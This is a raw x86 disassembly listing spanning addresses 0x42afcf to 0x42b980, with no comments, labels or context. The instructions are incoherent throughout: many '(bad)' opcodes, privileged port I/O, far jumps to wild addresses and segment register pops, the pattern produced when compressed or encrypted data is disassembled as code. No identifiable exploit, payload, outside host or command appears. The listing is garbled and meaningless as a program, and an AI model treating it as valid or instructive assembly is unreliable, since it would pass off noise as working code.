  42afcf:	mov    edx,0xef37e2a3
  42afd4:	jmp    0x7e520ea0
  42afd9:	pause  
  42afdb:	retf   0xbbae
  42afde:	add    eax,0x3ec0d51f
  42afe3:	js     0x42b039
  42afe5:	push   ds
  42afe6:	stos   BYTE PTR es:[edi],al
  42afe7:	rol    BYTE PTR [esi-0x45fcd8b8],1
  42afed:	fist   DWORD PTR [esi+eiz*4]
  42aff0:	jmp    0x42afe9
  42aff2:	cmp    BYTE PTR [ebx-0x6d],ah
  42aff5:	inc    eax
  42aff6:	out    0x65,eax
  42aff8:	xor    al,0xb1
  42affa:	sbb    al,BYTE PTR [edi]
  42affc:	push   cs
  42affd:	call   0x24621d1b
  42b002:	lock fwait
  42b004:	cmp    cl,BYTE PTR [edx-0x40]
  42b007:	pop    ds
  42b008:	fadd   QWORD PTR [ebp-0x50]
  42b00b:	lods   al,BYTE PTR ds:[esi]
  42b00c:	outs   dx,BYTE PTR ds:[esi]
  42b00d:	cwde   
  42b00e:	add    esp,DWORD PTR [ecx+0x7d2d7d1a]
  42b014:	cmp    al,0x83
  42b016:	cld    
  42b017:	xor    al,0x13
  42b019:	xor    al,0xf3
  42b01b:	jnp    0x42afa0
  42b01d:	mov    eax,ds:0x4ed36369
  42b022:	lods   al,BYTE PTR ds:[esi]
  42b023:	scas   al,BYTE PTR es:[edi]
  42b024:	ror    DWORD PTR [esp+ebx*8],1
  42b027:	push   esi
  42b028:	dec    eax
  42b029:	add    bh,ch
  42b02b:	lock mov ah,0xdd
  42b02e:	in     al,0x9e
  42b030:	in     al,0x23
  42b032:	jmp    0xb7397c51
  42b037:	test   BYTE PTR [ecx-0x76a9b113],dl
  42b03d:	test   eax,0xe78f46b8
  42b042:	lods   eax,DWORD PTR ds:[esi]
  42b043:	mov    ds:0xaddbcad3,eax
  42b048:	inc    edx
  42b049:	bound  ecx,QWORD PTR [ebx+0x0]
  42b04c:	sub    eax,0x211126f3
  42b051:	adc    BYTE PTR [esi+ecx*8-0x25866f28],0x80
  42b059:	int3   
  42b05a:	push   0xffffffb6
  42b05c:	xor    BYTE PTR [edi],0x1
  42b05f:	pushf  
  42b060:	clc    
  42b061:	mov    ds:0xf84485ff,eax
  42b066:	test   ecx,ebp
  42b068:	or     cl,bl
  42b06a:	lods   eax,DWORD PTR ds:[esi]
  42b06b:	outs   dx,BYTE PTR ds:[esi]
  42b06c:	dec    esp
  42b06d:	jl     0x42aff1
  42b06f:	pop    ebp
  42b070:	push   ebp
  42b071:	mov    ?,WORD PTR [edx]
  42b073:	sub    eax,0x32a0712d
  42b078:	in     eax,dx
  42b079:	jg     0x42affe
  42b07b:	push   es
  42b07c:	stos   BYTE PTR es:[edi],al
  42b07d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b07e:	sub    BYTE PTR [edi+ebx*1+0x1f],ch
  42b082:	pop    edx
  42b083:	test   BYTE PTR [esi-0x2d],ch
  42b086:	fs push ecx
  42b088:	scas   al,BYTE PTR es:[edi]
  42b089:	push   ss
  42b08a:	jle    0x42b064
  42b08c:	cmp    edx,edx
  42b08e:	lods   eax,DWORD PTR ds:[esi]
  42b08f:	test   cl,bh
  42b091:	retf   
  42b092:	mov    bl,0x60
  42b094:	btc    esp,ebp
  42b097:	sbb    eax,0xddbd1191
  42b09c:	int    0xbd
  42b09e:	dec    ebx
  42b09f:	aaa    
  42b0a0:	xchg   ebp,eax
  42b0a1:	loopne 0x42b0ca
  42b0a3:	rcr    DWORD PTR [ecx+esi*8-0x1a],0x35
  42b0a8:	xlat   BYTE PTR ds:[ebx]
  42b0a9:	xchg   edi,eax
  42b0aa:	pop    es
  42b0ab:	icebp  
  42b0ac:	add    al,0x9f
  42b0ae:	pop    DWORD PTR [edi+edx*1+0x1f]
  42b0b2:	icebp  
  42b0b3:	in     eax,0xf8
	...
  42b115:	add    BYTE PTR [ebp+0x25],dh
  42b118:	imul   ebx,DWORD PTR [edi-0x51]
  42b11c:	cmc    
  42b11d:	(bad)  
  42b11e:	dec    DWORD PTR [edi+0x7c3180ad]
  42b124:	add    edi,esi
  42b126:	scas   al,BYTE PTR es:[edi]
  42b127:	int3   
  42b128:	add    DWORD PTR [eax],eax
  42b12a:	pop    es
  42b12b:	add    DWORD PTR [eax],eax
  42b12d:	add    BYTE PTR [esi],ah
  42b12f:	xchg   edi,eax
  42b130:	push   es
  42b131:	xlat   BYTE PTR ds:[ebx]
  42b132:	enter  0xc02f,0xc7
  42b136:	and    eax,0xb4736ee3
  42b13b:	cmp    eax,0x400cc88c
  42b140:	push   es
  42b141:	iret   
  42b142:	iret   
  42b143:	fdiv   QWORD PTR [edx+ebx*2-0x51a6e25d]
  42b14a:	pop    esi
  42b14b:	out    0x9d,al
  42b14d:	mov    eax,0x67e4234d
  42b152:	retf   0x7f26
  42b155:	mov    ?,WORD PTR [esi-0x2d]
  42b158:	imul   esp,DWORD PTR [ebx+0x20],0x44
  42b15c:	xor    esp,DWORD PTR [eax]
  42b15e:	test   BYTE PTR [esi-0xdce5c3c],ch
  42b164:	push   edi
  42b165:	mov    edx,0x4e48e1ed
  42b16a:	xchg   ecx,eax
  42b16b:	fdiv   DWORD PTR [edx]
  42b16d:	adc    cl,bh
  42b16f:	fcmovbe st,st(0)
  42b171:	mov    dh,0xf1
  42b173:	mov    ch,0x41
  42b175:	xor    DWORD PTR [eax-0x70],ecx
  42b178:	in     eax,dx
  42b179:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b17a:	cs aaa 
  42b17c:	xchg   ebp,eax
  42b17d:	rcl    dh,1
  42b17f:	sbb    DWORD PTR [edx],0xa09de043
  42b185:	inc    esi
  42b186:	jge    0x42b1aa
  42b188:	out    dx,al
  42b189:	add    DWORD PTR [ebx],esp
  42b18b:	mov    ds:0xfb5fe800,al
  42b190:	cdq    
  42b191:	mov    esi,ss
  42b193:	fsubr  QWORD PTR [ecx]
  42b195:	sbb    al,0x54
  42b197:	stos   BYTE PTR es:[edi],al
  42b198:	aam    0x40
  42b19a:	sbb    eax,0xe446adfe
  42b19f:	jmp    0x42b1b4
  42b1a1:	imul   esi,DWORD PTR [esi+0x1f],0xffffff93
  42b1a5:	mov    ebx,0xc95c7d6b
  42b1aa:	mov    edi,0x1cae9bb2
  42b1af:	out    dx,al
  42b1b0:	test   DWORD PTR [edx+0x0],0x37340042
  42b1b7:	push   ecx
  42b1b8:	jecxz  0x42b179
  42b1ba:	retf   0xea4d
  42b1bd:	leave  
  42b1be:	jg     0x42b203
  42b1c0:	fsub   QWORD PTR ss:[ecx+0x6e]
  42b1c4:	cmp    BYTE PTR [eax+0x35],ah
  42b1c7:	and    al,0xc4
  42b1c9:	imul   ebp,DWORD PTR [eax-0x44],0x46057435
  42b1d0:	popf   
  42b1d1:	mov    eax,ds:0x7b7f759f
  42b1d6:	pop    ecx
  42b1d7:	xchg   esp,eax
  42b1d8:	neg    BYTE PTR [eax]
  42b1da:	popa   
  42b1db:	retf   
  42b1dc:	pop    es
  42b1dd:	popf   
  42b1de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b1df:	shr    BYTE PTR [ecx+0x10885b0b],cl
  42b1e5:	jle    0x42b23c
  42b1e7:	imul   esp,DWORD PTR [ebp-0x6b740e78],0x482f764f
  42b1f1:	ins    DWORD PTR es:[edi],dx
  42b1f2:	inc    ecx
  42b1f3:	jg     0x42b242
  42b1f5:	test   esi,eax
  42b1f7:	jae    0x42b1eb
  42b1f9:	pop    es
  42b1fa:	fwait
  42b1fb:	mov    eax,ds:0x444a68c0
  42b200:	jle    0x42b202
  42b202:	jl     0x42b189
  42b204:	jnp    0x42b21c
  42b206:	sti    
  42b207:	and    DWORD PTR [eax+0x32],ebp
  42b20a:	sub    DWORD PTR [ebp-0x6e],0xdffa2e9b
  42b211:	sub    al,0x33
  42b213:	(bad)  
  42b214:	mov    ?,WORD PTR [edx]
  42b216:	dec    edi
  42b217:	push   ebx
  42b218:	or     dl,dh
  42b21a:	jl     0x42b24f
  42b21c:	xchg   ah,ch
  42b21e:	jp     0x42b229
  42b220:	lds    ebp,FWORD PTR [ebx-0x10]
  42b223:	or     eax,0x17c5a1c8
  42b228:	repz xor cl,BYTE PTR [eax]
  42b22b:	dec    esi
  42b22c:	cmp    al,0x32
  42b22e:	arpl   di,sp
  42b230:	dec    edi
  42b231:	jle    0x42b1ff
  42b233:	aas    
  42b234:	adc    eax,DWORD PTR [eax]
	...
  42b296:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b297:	mov    ds,WORD PTR [ecx-0x28844a0]
  42b29d:	iret   
  42b29e:	arpl   dx,si
  42b2a0:	or     BYTE PTR [ebp-0xf],ch
  42b2a3:	pop    ds
  42b2a4:	xchg   dl,cl
  42b2a6:	mov    ch,0xcd
  42b2a8:	add    DWORD PTR [eax],eax
  42b2aa:	pop    es
  42b2ab:	add    DWORD PTR [eax],eax
  42b2ad:	add    al,cl
  42b2af:	sti    
  42b2b0:	cmp    eax,0x1dd25916
  42b2b5:	push   ecx
  42b2b6:	rcl    cl,cl
  42b2b8:	xor    DWORD PTR [eax-0x68],esp
  42b2bb:	sbb    edi,DWORD PTR [esi+edi*8+0x512b8770]
  42b2c2:	xchg   ebp,eax
  42b2c3:	test   al,0x20
  42b2c5:	(bad)  
  42b2c6:	loopne 0x42b269
  42b2c8:	sub    ah,BYTE PTR [esi]
  42b2ca:	shl    DWORD PTR [edx-0xb57749c],0xe4
  42b2d1:	test   BYTE PTR [edi+0x12],cl
  42b2d4:	aas    
  42b2d5:	jno    0x42b2f7
  42b2d7:	mov    ecx,DWORD PTR [eax-0x3e]
  42b2da:	adc    eax,0x58c373c6
  42b2df:	jne    0x42b2ef
  42b2e1:	lods   al,BYTE PTR ds:[esi]
  42b2e2:	rcl    BYTE PTR [edx],0x84
  42b2e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b2e6:	mov    bh,0x26
  42b2e8:	or     DWORD PTR [eax+0x17bf9494],ebx
  42b2ee:	fmul   QWORD PTR [eax-0x33]
  42b2f1:	xlat   BYTE PTR ds:[ebx]
  42b2f2:	lds    esi,FWORD PTR [esi+0x26]
  42b2f5:	pushf  
  42b2f6:	mov    ebx,edx
  42b2f8:	bound  ecx,QWORD PTR [edx-0x2276a4b0]
  42b2fe:	xor    al,0x40
  42b300:	mov    esi,DWORD PTR ds:0xdb83e635
  42b306:	fld    QWORD PTR [ebp+0x70bf8f83]
  42b30c:	xor    ebx,edi
  42b30e:	fwait
  42b30f:	jmp    FWORD PTR [ecx]
  42b311:	mov    ecx,0xa56c95ba
  42b316:	ja     0x42b35e
  42b318:	popa   
  42b319:	sbb    ebx,DWORD PTR [ecx+edx*8+0x95d0602]
  42b320:	(bad)
  42b323:	fwait
  42b324:	js     0x42b35c
  42b326:	jp     0x42b34f
  42b328:	adc    BYTE PTR [edi],dh
  42b32a:	xor    eax,0x40462a3c
  42b32f:	sub    bl,0x4b
  42b332:	ret    0xf4f6
  42b335:	sbb    ebp,DWORD PTR [edi-0x1e]
  42b338:	xor    ch,BYTE PTR [edi-0x6642026e]
  42b33e:	aad    0xee
  42b340:	or     DWORD PTR [esi+0x7c84228e],eax
  42b346:	xor    eax,0xbc77a34d
  42b34b:	mov    ch,0x8d
  42b34d:	xor    ebp,DWORD PTR [edx+ebx*4+0x53]
  42b351:	dec    edx
  42b352:	aam    0x41
  42b354:	stc    
  42b355:	fstp   DWORD PTR [ecx+0x38a627fb]
  42b35b:	adc    al,BYTE PTR [edx-0x20054dcd]
  42b361:	pop    edx
  42b362:	loop   0x42b30f
  42b364:	out    0x8c,eax
  42b366:	and    al,0x44
  42b368:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b369:	add    al,0xda
  42b36b:	(bad)  
  42b36c:	xchg   esi,eax
  42b36d:	push   DWORD PTR [eax+esi*8+0x65]
  42b371:	clc    
  42b372:	leave  
  42b373:	pop    edx
  42b374:	mov    edx,0x1770e9a2
  42b379:	mov    al,ds:0x109d1498
  42b37e:	mov    eax,ds:0xbeba1043
  42b383:	or     bh,0xbb
  42b386:	pop    edi
  42b387:	pop    eax
  42b388:	add    DWORD PTR ds:0xdff3e0ce,edx
  42b38e:	ficomp WORD PTR [ebp+0x48bce60e]
  42b394:	mov    eax,0x22e62ec
  42b399:	add    edi,eax
  42b39b:	add    ah,bh
  42b39d:	cmp    DWORD PTR [esi+esi*1],0x33
  42b3a1:	shufps xmm3,XMMWORD PTR [esi],0x16
  42b3a5:	fstp   TBYTE PTR [esi-0x51f29bd1]
  42b3ab:	loope  0x42b34b
  42b3ad:	popa   
  42b3ae:	pop    esp
  42b3af:	cld    
  42b3b0:	push   esp
  42b3b1:	(bad)
  42b3b4:	pop    ecx
	...
  42b415:	add    BYTE PTR [edx-0x1011dfbb],cl
  42b41b:	out    dx,eax
  42b41c:	into   
  42b41d:	shl    BYTE PTR gs:[esp+esi*8+0x42],0xca
  42b423:	or     bl,BYTE PTR [ebx+0x6b]
  42b426:	mov    esp,0x70001ce
  42b42b:	add    DWORD PTR [eax],eax
  42b42d:	add    BYTE PTR ds:0x1a358cab,ah
  42b433:	sub    eax,0x2f0145fb
  42b438:	push   ebx
  42b439:	test   BYTE PTR [ebp-0x1e],ch
  42b43c:	cwde   
  42b43d:	jg     0x42b3f6
  42b43f:	(bad)  
  42b440:	or     eax,0x8f551b06
  42b445:	mov    ds:0x5f01d0ab,eax
  42b44a:	xchg   BYTE PTR [esi+edx*1],al
  42b44d:	mov    bh,0x26
  42b44f:	call   0x1dab776e
  42b454:	mov    al,0x26
  42b456:	push   ecx
  42b457:	push   ss
  42b458:	xchg   ecx,eax
  42b459:	mov    ecx,esp
  42b45b:	adc    ch,BYTE PTR [edx]
  42b45d:	or     bl,BYTE PTR [eax+0x97e588e]
  42b463:	push   DWORD PTR [esi]
  42b465:	inc    ecx
  42b466:	mov    ebp,0x9d3cee4
  42b46b:	scas   al,BYTE PTR es:[edi]
  42b46c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b46d:	ret    
  42b46e:	add    BYTE PTR [ebp+0x72],ch
  42b471:	ficom  WORD PTR [esi+0x47]
  42b474:	sub    BYTE PTR [edi-0x67ca9e42],cl
  42b47a:	mov    edi,0xb9330b9b
  42b47f:	outs   dx,BYTE PTR ds:[esi]
  42b480:	loope  0x42b495
  42b482:	lea    ecx,[ebx-0x12fec207]
  42b488:	je     0x42b4e5
  42b48a:	push   ebp
  42b48b:	jg     0x42b488
  42b48d:	push   0xe7c868cd
  42b492:	in     al,dx
  42b493:	pop    esi
  42b494:	in     al,0xff
  42b496:	dec    esp
  42b497:	push   ebp
  42b498:	stc    
  42b499:	inc    ebp
  42b49a:	int3   
  42b49b:	and    BYTE PTR [esi-0xc],dl
  42b49e:	mov    edi,0x19410f9
  42b4a3:	es jne 0x42b4b8
  42b4a6:	stc    
  42b4a7:	dec    esp
  42b4a8:	lahf   
  42b4a9:	pop    esp
  42b4aa:	test   cl,0xe7
  42b4ad:	enter  0x7303,0x6e
  42b4b1:	xor    dh,dl
  42b4b3:	dec    ebx
  42b4b4:	je     0x42b4eb
  42b4b6:	sbb    al,0x34
  42b4b8:	push   esi
  42b4b9:	scas   al,BYTE PTR es:[edi]
  42b4ba:	dec    ecx
  42b4bb:	xor    ah,BYTE PTR [esi-0x52991635]
  42b4c1:	mov    ecx,0x78219ac0
  42b4c6:	xor    DWORD PTR [ecx],0xffffff91
  42b4c9:	add    cl,BYTE PTR [edx]
  42b4cb:	mov    ds:0x55b48d6a,eax
  42b4d0:	(bad)  
  42b4d1:	pop    ds
  42b4d2:	popf   
  42b4d3:	pop    esp
  42b4d4:	mov    ebp,0xb95b44ac
  42b4d9:	(bad)  
  42b4da:	mov    bl,0x98
  42b4dc:	dec    edx
  42b4dd:	adc    bl,bh
  42b4df:	xchg   ebx,eax
  42b4e0:	(bad)  
  42b4e1:	mov    ebx,0x2f881f23
  42b4e6:	retf   0xd4c6
  42b4e9:	ficom  WORD PTR [eax+0x62469d08]
  42b4ef:	or     al,0x34
  42b4f1:	inc    edi
  42b4f2:	xor    eax,DWORD PTR [edx+0x61b242e6]
  42b4f8:	sub    DWORD PTR [ebx-0x1a],edx
  42b4fb:	pusha  
  42b4fc:	mov    ds:0xf9eac929,eax
  42b501:	fmul   QWORD PTR [ebx+0x23]
  42b504:	mov    ch,bh
  42b506:	fist   WORD PTR [eax-0x70]
  42b509:	aad    0xb3
  42b50b:	add    cl,dh
  42b50d:	leave  
  42b50e:	out    dx,eax
  42b50f:	or     DWORD PTR [edx+0x6a608225],0xc
  42b516:	jmp    0x3c89:0x515c82
  42b51d:	add    BYTE PTR [ecx+0x324ece87],dh
  42b523:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b524:	cmp    ch,BYTE PTR [edx+0x368a5c90]
  42b52a:	pop    ebp
  42b52b:	push   eax
  42b52c:	mov    ah,0x3b
  42b52e:	sbb    al,0x63
  42b530:	mov    ecx,0xb3604803
	...
  42b595:	add    al,ah
  42b597:	xchg   esp,eax
  42b598:	and    bh,cl
  42b59a:	je     0x42b59b
  42b59c:	out    dx,eax
  42b59d:	mov    edi,0xcf8f6ca5
  42b5a2:	in     eax,dx
  42b5a3:	jns    0x42b5f5
  42b5a5:	jg     0x42b56a
  42b5a7:	iret   
  42b5a8:	add    DWORD PTR [eax],eax
  42b5aa:	pop    es
  42b5ab:	add    DWORD PTR [eax],eax
  42b5ad:	add    dh,bh
  42b5af:	dec    edx
  42b5b0:	lods   al,BYTE PTR ds:[esi]
  42b5b1:	idiv   DWORD PTR [edx+0x18]
  42b5b4:	mov    DWORD PTR [ebx+0x3789f516],edi
  42b5ba:	in     al,0xd6
  42b5bc:	(bad)  
  42b5bd:	xor    al,ch
  42b5bf:	adc    ebp,DWORD PTR [ebx-0x293b896d]
  42b5c5:	popf   
  42b5c6:	(bad)  
  42b5c7:	daa    
  42b5c8:	jo     0x42b566
  42b5ca:	add    cl,0xe2
  42b5cd:	adc    DWORD PTR [eax+ebx*4-0x6d],edi
  42b5d1:	ror    DWORD PTR [edi],cl
  42b5d3:	repnz dec ecx
  42b5d5:	push   ds
  42b5d6:	sar    BYTE PTR [edx+0x531e5ac9],0x38
  42b5dd:	aam    0x16
  42b5df:	stc    
  42b5e0:	sbb    DWORD PTR ds:0x8a04058b,edi
  42b5e6:	jbe    0x42b587
  42b5e8:	mov    ebx,0xa4c8dfdf
  42b5ed:	add    eax,0xfbb599b3
  42b5f2:	add    BYTE PTR [edx+0x139c99c],ah
  42b5f8:	and    BYTE PTR [ebp+0x672ccc6b],bl
  42b5fe:	jno    0x42b593
  42b600:	xchg   ecx,eax
  42b601:	inc    ecx
  42b602:	adc    edx,edi
  42b604:	rcr    ebx,1
  42b606:	mov    al,ds:0x6d8b4e6f
  42b60b:	xchg   esi,eax
  42b60c:	push   edi
  42b60d:	cs sti 
  42b60f:	dec    ebp
  42b610:	popa   
  42b611:	dec    edi
  42b612:	ds lahf 
  42b614:	push   es
  42b615:	mov    DWORD PTR ds:0x93d2bcd2,esp
  42b61b:	xchg   ecx,eax
  42b61c:	or     bh,BYTE PTR [edi-0x12]
  42b61f:	xor    al,0x85
  42b621:	pop    ds
  42b622:	rol    esp,cl
  42b624:	inc    al
  42b626:	outs   dx,DWORD PTR ds:[esi]
  42b627:	addr16 mov esi,0xd53548b2
  42b62d:	lock push edx
  42b62f:	data16 stc 
  42b631:	inc    esp
  42b632:	dec    eax
  42b633:	cmovp  ebp,DWORD PTR [ecx]
  42b636:	ret    0xcae1
  42b639:	jnp    0x42b61f
  42b63b:	cs scas eax,DWORD PTR es:[edi]
  42b63d:	xchg   ebx,eax
  42b63e:	push   ecx
  42b63f:	lock sub eax,0x7ce86867
  42b645:	fisub  WORD PTR [edx-0x17108479]
  42b64b:	or     al,0x38
  42b64d:	or     eax,0x7f799585
  42b652:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b653:	sbb    eax,0x48f616eb
  42b658:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b659:	out    0xff,eax
  42b65b:	pop    eax
  42b65c:	loop   0x42b657
  42b65e:	js     0x42b666
  42b660:	mov    ebp,0xd997c329
  42b665:	sub    BYTE PTR [ebx+0x42],bh
  42b668:	push   ss
  42b669:	in     eax,0x97
  42b66b:	inc    esp
  42b66c:	jecxz  0x42b68a
  42b66e:	dec    edx
  42b66f:	(bad)  
  42b670:	mov    WORD PTR [ebp+0x304f425c],ss
  42b676:	inc    esp
  42b677:	xchg   ebp,eax
  42b678:	cmp    ecx,DWORD PTR [esp+eax*4-0x1f2247eb]
  42b67f:	(bad)  
  42b682:	enter  0xd8f6,0xef
  42b686:	loope  0x42b670
  42b688:	int3   
  42b689:	stos   BYTE PTR es:[edi],al
  42b68a:	mov    eax,0xc3d829c7
  42b68f:	inc    ebx
  42b690:	and    al,0xc7
  42b692:	shl    BYTE PTR ds:0xbcd39d8b,0xf7
  42b69a:	inc    ecx
  42b69b:	mov    fs,WORD PTR [edx]
  42b69d:	push   ss
  42b69e:	popa   
  42b69f:	(bad)  
  42b6a0:	fdivr  DWORD PTR [ecx+esi*4]
  42b6a3:	int    0x97
  42b6a5:	sbb    BYTE PTR [ebx-0x62da8f3],0xe3
  42b6ac:	xchg   ecx,eax
  42b6ad:	(bad)  
  42b6ae:	loope  0x42b68d
  42b6b0:	push   esi
  42b6b1:	cmp    bl,BYTE PTR [eax+0x2266]
	...
  42b713:	add    BYTE PTR [eax],al
  42b715:	add    BYTE PTR [esi+0x42],cl
  42b718:	dec    ecx
  42b719:	daa    
  42b71a:	dec    ebp
  42b71b:	das    
  42b71c:	outs   dx,BYTE PTR ds:[esi]
  42b71d:	imul   eax,DWORD PTR [ebx],0xffffffcd
  42b720:	sub    BYTE PTR [ebp-0x7f],bl
  42b723:	adc    al,0x97
  42b725:	retf   0xd0ca
  42b728:	add    DWORD PTR [eax],eax
  42b72a:	pop    es
  42b72b:	add    DWORD PTR [eax],eax
  42b72d:	add    cl,bl
  42b72f:	rol    BYTE PTR [eax+0x590956b7],cl
  42b735:	popa   
  42b736:	rol    BYTE PTR [esi],cl
  42b738:	or     eax,0xead41627
  42b73d:	mov    al,0x1e
  42b73f:	adc    BYTE PTR [ebx],cl
  42b741:	in     al,0x66
  42b743:	dec    ebp
  42b744:	cmp    DWORD PTR [ecx],ecx
  42b746:	push   0xe4c9f191
  42b74b:	mov    edx,0xba25a255
  42b750:	cmp    al,0xaf
  42b752:	jg     0x42b788
  42b754:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b755:	ds aaa 
  42b757:	mov    ch,0xee
  42b759:	jle    0x42b71c
  42b75b:	rcr    DWORD PTR [edx],1
  42b75d:	add    al,0x58
  42b75f:	bound  edx,QWORD PTR es:[edi]
  42b762:	or     eax,0x5a1ddec5
  42b767:	xor    al,0x4d
  42b769:	fdiv   QWORD PTR ds:[esi+0x46]
  42b76d:	and    bl,BYTE PTR [ecx]
  42b76f:	and    al,0x67
  42b771:	out    dx,eax
  42b772:	repnz mov al,ds:0x2daa9740
  42b778:	push   0xffffff91
  42b77a:	dec    esi
  42b77b:	jbe    0x42b796
  42b77d:	mov    ah,0x5f
  42b77f:	mov    DWORD PTR [eax-0x57042ae1],edx
  42b785:	test   bl,0x5b
  42b788:	and    eax,0x4b81a8ca
  42b78d:	xchg   esi,eax
  42b78e:	imul   ebx,DWORD PTR [esi-0x33],0xffffffb3
  42b792:	cmp    al,0x94
  42b794:	adc    BYTE PTR [ecx+0x23],ch
  42b797:	bndstx [edx-0x2783579b],(bad)
  42b79e:	pop    ds
  42b79f:	cli    
  42b7a0:	in     eax,0xa1
  42b7a2:	mov    edx,0x355970b6
  42b7a7:	xor    al,0x8c
  42b7a9:	adc    dl,BYTE PTR [ebx+0x446a9d33]
  42b7af:	in     al,dx
  42b7b0:	push   esi
  42b7b1:	adc    ch,BYTE PTR [edx-0x16]
  42b7b4:	xor    eax,DWORD PTR [esi-0x1eb8f8ec]
  42b7ba:	adc    edx,esp
  42b7bc:	mov    eax,ds:0xd3b98640
  42b7c1:	jo     0x42b7f4
  42b7c3:	mov    edx,0xd7f2ee95
  42b7c8:	push   cs
  42b7c9:	dec    ecx
  42b7ca:	out    0x9a,eax
  42b7cc:	stos   DWORD PTR es:[edi],eax
  42b7cd:	mov    DWORD PTR [eax+0x7a],esi
  42b7d0:	call   0xc568ad6
  42b7d5:	cmc    
  42b7d6:	retf   0xa657
  42b7d9:	scas   eax,DWORD PTR es:[edi]
  42b7da:	sbb    eax,DWORD PTR [edx+0x608dac0d]
  42b7e0:	aaa    
  42b7e1:	mov    ds:0xf0c1e7cd,eax
  42b7e6:	test   al,0xe8
  42b7e8:	std    
  42b7e9:	ins    BYTE PTR es:[edi],dx
  42b7ea:	fdivrp st(4),st
  42b7ec:	sub    al,BYTE PTR [ebp+eax*1+0x59]
  42b7f0:	test   BYTE PTR [edx-0x69],dl
  42b7f3:	adc    BYTE PTR [ebp-0x6b14b55e],dl
  42b7f9:	(bad)  
  42b7fa:	xor    esi,esi
  42b7fc:	ret    0xeb4
  42b7ff:	lock or eax,0x734fac76
  42b805:	push   ds
  42b806:	clc    
  42b807:	sbb    esi,DWORD PTR [ebx-0x2c17edfb]
  42b80d:	sbb    BYTE PTR [edi],0x9e
  42b810:	fldenvw [ebp-0x17]
  42b814:	dec    eax
  42b815:	mov    dl,0x3c
  42b817:	add    al,0xad
  42b819:	sbb    cl,BYTE PTR ds:0xfc8e0bd9
  42b81f:	fnstsw WORD PTR [ebx-0x6f8c104b]
  42b825:	aad    0xf4
  42b827:	sub    esp,DWORD PTR [esi-0x62]
  42b82a:	dec    esp
  42b82b:	jecxz  0x42b8a9
  42b82d:	out    0x83,al
  42b82f:	ret    0xa443
  42b832:	mov    edi,0xb48a
	...
  42b893:	add    BYTE PTR [eax],al
  42b895:	add    al,ch
  42b897:	popf   
  42b898:	mov    esi,0xf9e7ffe7
  42b89d:	lahf   
  42b89e:	xor    bl,dh
  42b8a0:	add    ecx,DWORD PTR [esi-0x6ef1894]
  42b8a6:	rcl    ecx,1
  42b8a8:	add    DWORD PTR [eax],eax
  42b8aa:	pop    es
  42b8ab:	add    DWORD PTR [eax],eax
  42b8ad:	add    BYTE PTR [ebx+eiz*1],dl
  42b8b0:	and    ebp,DWORD PTR [esi]
  42b8b2:	xor    eax,0x5ab75d2e
  42b8b7:	xor    al,0x87
  42b8b9:	loopne 0x42b8ea
  42b8bb:	push   edi
  42b8bc:	int3   
  42b8bd:	inc    edi
  42b8be:	dec    ecx
  42b8bf:	mov    WORD PTR [esi+0x3ae58e61],es
  42b8c5:	test   eax,0xc8f07625
  42b8ca:	add    bh,BYTE PTR [eax-0x534b1750]
  42b8d0:	test   ecx,ebx
  42b8d2:	jbe    0x42b8d8
  42b8d4:	cmp    al,0x88
  42b8d6:	ins    DWORD PTR es:[edi],dx
  42b8d7:	in     eax,dx
  42b8d8:	jae    0x42b8fb
  42b8da:	rcr    ebx,cl
  42b8dc:	xchg   ecx,eax
  42b8dd:	add    BYTE PTR [ebx-0x70718f87],dh
  42b8e3:	in     al,dx
  42b8e4:	push   gs
  42b8e6:	dec    ebx
  42b8e7:	pop    ebx
  42b8e8:	outs   dx,BYTE PTR ds:[esi]
  42b8e9:	sub    DWORD PTR [eax+0x52],edx
  42b8ec:	xchg   ecx,eax
  42b8ed:	jne    0x42b8de
  42b8ef:	pop    ds
  42b8f0:	cmp    edx,0x936a95ac
  42b8f6:	(bad)  
  42b8f7:	in     al,dx
  42b8f8:	sbb    ebp,DWORD PTR [eax]
  42b8fa:	jbe    0x42b8e6
  42b8fc:	xor    DWORD PTR [ecx],edi
  42b8fe:	lds    edx,FWORD PTR [ebx-0x41]
  42b901:	clc    
  42b902:	jne    0x42b8bf
  42b904:	loop   0x42b8d1
  42b906:	or     al,0x77
  42b908:	aad    0xae
  42b90a:	mov    eax,ds:0x2554ea31
  42b90f:	je     0x42b8b4
  42b911:	jnp    0x42b983
  42b913:	(bad)  
  42b914:	dec    edi
  42b915:	pop    eax
  42b916:	out    dx,al
  42b917:	in     al,0x0
  42b919:	dec    esp
  42b91a:	inc    eax
  42b91b:	add    BYTE PTR [ebx-0x80],ah
  42b91e:	daa    
  42b91f:	dec    edi
  42b920:	dec    edx
  42b921:	or     DWORD PTR [eax],eax
  42b923:	bound  ebx,QWORD PTR [eax]
  42b925:	fist   DWORD PTR [eax-0x460d9fb2]
  42b92b:	mov    esp,0x1c9757cb
  42b930:	imul   ebx,DWORD PTR [esi+ecx*2+0x76],0x36df7166
  42b938:	lods   al,BYTE PTR ds:[esi]
  42b939:	nop
  42b93a:	fcomp  QWORD PTR [edi]
  42b93c:	xor    esp,ebp
  42b93e:	stos   DWORD PTR es:[edi],eax
  42b93f:	mov    esp,0xaab649db
  42b944:	mov    es,WORD PTR [ecx-0x7852db8]
  42b94a:	test   DWORD PTR [esi+0x6ffa74dd],esp
  42b950:	mov    edx,0x12e7a9df
  42b955:	popf   
  42b956:	cmp    eax,0x7a393775
  42b95b:	push   ecx
  42b95c:	(bad)  
  42b95d:	mov    cl,0x45
  42b95f:	mov    ebx,0x8e7b1b8d
  42b964:	loop   0x42b955
  42b966:	ds pop esp
  42b968:	push   ebx
  42b969:	jmp    0x1fa1:0xada0247c
  42b970:	stos   BYTE PTR es:[edi],al
  42b971:	dec    esp
  42b972:	icebp  
  42b973:	pop    es
  42b974:	xor    dl,dh
  42b976:	les    ecx,FWORD PTR [esi+0x6c]
  42b979:	sub    BYTE PTR [ebp+0x1d46137e],0xa9
  42b980:	push   eax
